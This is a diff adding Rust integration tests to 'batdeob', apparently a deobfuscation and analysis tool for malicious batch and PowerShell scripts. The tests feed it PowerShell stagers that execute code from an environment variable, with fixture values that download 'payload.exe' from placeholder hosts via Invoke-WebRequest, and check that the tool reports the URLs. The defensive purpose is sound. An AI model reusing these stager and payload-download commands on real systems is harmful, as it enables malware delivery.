@@ -606,3 +606,136 @@ fn analyze_can_enrich_lolbas_matches_from_external_json() {
         Some("T1218.011")
     );
 }
+
+#[test]
+fn analyze_env_option_unlocks_powershell_env_payload() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("child.cmd.txt");
+    fs::write(
+        &input,
+        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--env",
+            "HARRINGTON_STAGE=Invoke-WebRequest https://cli-env.example/payload.exe -OutFile payload.exe",
+            input.to_str().expect("path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");
+
+    assert!(
+        json["traits"].as_array().expect("traits").iter().any(|t| t
+            .to_string()
+            .contains("https://cli-env.example/payload.exe")),
+        "--env did not unlock env-backed PowerShell payload:\n{}",
+        String::from_utf8_lossy(&out)
+    );
+}
+
+#[test]
+fn analyze_env_file_unlocks_powershell_env_payload() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("child.cmd.txt");
+    let env_file = dir.path().join("sandbox.env");
+    fs::write(
+        &input,
+        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
+    )
+    .expect("write");
+    fs::write(
+        &env_file,
+        "\n# copied sandbox env\nHARRINGTON_STAGE=Invoke-WebRequest https://cli-env-file.example/payload.exe -OutFile payload.exe\n",
+    )
+    .expect("write env");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--env-file",
+            env_file.to_str().expect("env path"),
+            input.to_str().expect("path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");
+
+    assert!(
+        json["traits"].as_array().expect("traits").iter().any(|t| t
+            .to_string()
+            .contains("https://cli-env-file.example/payload.exe")),
+        "--env-file did not unlock env-backed PowerShell payload:\n{}",
+        String::from_utf8_lossy(&out)
+    );
+}
+
+#[test]
+fn analyze_env_file_accepts_multiline_values() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("child.cmd.txt");
+    let env_file = dir.path().join("sandbox.env");
+    fs::write(
+        &input,
+        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
+    )
+    .expect("write");
+    fs::write(
+        &env_file,
+        "HARRINGTON_STAGE=$u='https://cli-env-multiline.example/payload.exe'\n$ignored = 'kept inside same value'\nInvoke-WebRequest $u -OutFile payload.exe\n",
+    )
+    .expect("write env");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--env-file",
+            env_file.to_str().expect("env path"),
+            input.to_str().expect("path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");
+
+    assert!(
+        json["traits"].as_array().expect("traits").iter().any(|t| t
+            .to_string()
+            .contains("https://cli-env-multiline.example/payload.exe")),
+        "--env-file multiline value did not unlock env-backed PowerShell payload:\n{}",
+        String::from_utf8_lossy(&out)
+    );
+}
+
+#[test]
+fn analyze_env_option_requires_assignment() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("child.cmd.txt");
+    fs::write(&input, "echo hi\r\n").expect("write");
+
+    Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--env",
+            "HARRINGTON_STAGE",
+            input.to_str().expect("path"),
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains("expected NAME=VALUE"));
+}
